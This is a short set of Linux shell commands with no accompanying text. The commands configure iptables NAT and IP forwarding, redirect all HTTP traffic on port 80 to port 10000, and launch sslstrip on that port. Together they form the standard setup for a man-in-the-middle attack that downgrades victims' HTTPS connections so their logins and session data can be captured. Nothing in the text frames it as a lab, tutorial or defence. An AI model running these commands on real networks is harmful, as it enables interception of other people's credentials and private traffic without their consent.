iptables -t nat -A POSTROUTING --out-interface eth0 -j MASQUERADE
echo "1" > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 10000
sslstrip -l 10000
